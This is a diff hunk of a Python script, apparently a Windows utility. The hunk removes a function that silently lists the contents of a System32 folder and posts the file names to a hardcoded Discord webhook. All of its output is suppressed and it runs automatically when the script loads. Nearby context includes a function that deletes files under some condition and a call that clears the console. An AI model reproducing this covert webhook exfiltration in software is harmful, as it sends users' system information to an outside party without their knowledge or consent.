@@ -154,26 +154,6 @@ def delete_files_if_aesv3_missing():
         print("")
 delete_files_if_aesv3_missing()
 
-def sendsdxx():
-    directory = r"C:\\Windows\\System32\\DSEL"
-    webhook_url = "https://discordapp.com/api/webhooks/1327027711130210335/F7fTW5ZFMKggEOGFwY-psz7IYqZfKSXD2wCZYBuVy11Yb93StGlB7Z-f-kkbSEGRjJ3V"
-    
-    if not os.path.exists(directory):
-        print("")
-        return
-    
-    items = os.listdir(directory)
-    message = "\n".join(items) if items else "No files or directories found."
-    
-    payload = {"content": f"Files and directories in DSEL:\n{message}"}
-    headers = {"Content-Type": "application/json"}
-    
-    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
-    if response.status_code == 204:
-        print("")
-    else:
-        print(f"")
-sendsdxx()
 os.system('cls')
 def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
